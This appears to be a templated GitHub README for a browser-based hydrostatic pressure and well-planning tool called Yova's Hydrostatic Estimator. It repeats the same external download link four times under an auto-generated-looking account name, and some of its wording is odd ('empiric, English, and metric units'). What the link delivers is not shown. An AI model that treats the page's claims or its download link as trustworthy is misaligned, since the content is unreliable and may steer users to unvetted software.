# Yova's Hydrostatic Estimator v2026 - well-planning tool 2026

> **A browser-run well planning app for hydrostatic pressure profiling, crosspoint analysis, and packer differential checks, delivered as a single-file HTML application in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/will-stonekcjl1499/yovas-hydrostatic-estimator-2026?style=flat-square)](https://github.com/will-stonekcjl1499/yovas-hydrostatic-estimator-2026)

---

<p align="center">
  <a href="https://will-stonekcjl1499.github.io/yovas-hydrostatic-estimator-2026/">
    <img src="https://img.shields.io/badge/Download-Yova%27s%20Hydrostatic%20Estimator%20Latest-brightgreen?style=for-the-badge" alt="Download Yova's Hydrostatic Estimator">
  </a>
</p>

> **[Direct Download - Yova's Hydrostatic Estimator v2026](https://will-stonekcjl1499.github.io/yovas-hydrostatic-estimator-2026/)**

---

[Download Latest Build](https://will-stonekcjl1499.github.io/yovas-hydrostatic-estimator-2026/)

---

## About Yova's Hydrostatic Estimator

Yova's Hydrostatic Estimator is a web-based planning utility for analyzing hydrostatic pressure conditions in wells. It centers on casing and tubing pressure curves by depth, giving you a practical way to inspect how pressure varies through the wellbore and to pinpoint the hydrostatic crosspoint without relying on manual graphing.

The app is aimed at workflows where TVD-based depth handling is important, including packer differential pressure checks and visual review of the well geometry. Since it ships as one HTML file, it is straightforward to open in a browser, distribute, and keep with planning documents or reports.

---

## Features

- Computes hydrostatic pressure for casing and tubing against depth
- Identifies the hydrostatic crosspoint for side-by-side profile comparison
- Shows packer differential pressure readings
- Provides an interactive 3D wellbore view
- Supports preset fluids as well as custom density entry
- Works with empiric, English, and metric units
- Produces a printable A4 report
- Uses TVD for depth calculations and on-screen presentation

---

## Installation

1. Download the repository files or clone the project:
   ```bash
   git clone https://github.com/will-stonekcjl1499/yovas-hydrostatic-estimator-2026.git
   ```
2. Open the single HTML file in a modern browser.
3. If you are using the published build, launch it from the download link above and load the page locally or in your browser.

No build step is required for basic use.

---

## Usage

1. Open the app in your browser.
2. Select a fluid preset or enter a custom density.
3. Choose the unit system you want to work in.
4. Review casing and tubing pressure profiles versus depth.
5. Check the hydrostatic crosspoint and packer differential pressure output.
6. Use the 3D wellbore view to inspect the geometry visually.
7. Export or print the A4 report when you need a shareable summary.

---

## Configuration

Most controls are exposed directly in the interface, including fluid choice, density, units, and report generation.

If you keep a local copy, place it with your project files and edit the HTML source only when you need to change labels, defaults, or embedded assets. The application is intended to run as a single-file browser document, so normal use does not require a separate config directory.

---

## Requirements

- A modern web browser
- JavaScript enabled
- Enough screen space to review charts and 3D wellbore visuals comfortably
- Optional printer access for the A4 report
- No dedicated runtime or install package is required beyond the HTML file

---

## FAQ

**How do I move to a newer build?**  
Swap your local copy for the latest published version, then open it again in the browser.

**Is any installation needed?**  
No. This is a single-file HTML application that runs in a browser.

**Where do I change the planning settings?**  
In the UI. Fluid presets, custom density, and unit selection are all adjustable from inside the app.

**What should I check if the charts or 3D view are missing?**  
Refresh the page, make sure JavaScript is enabled, and confirm that you opened the full HTML file in a supported browser.

**Can the results be printed?**  
Yes. The app includes an A4 report designed for printing or saving as a document.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
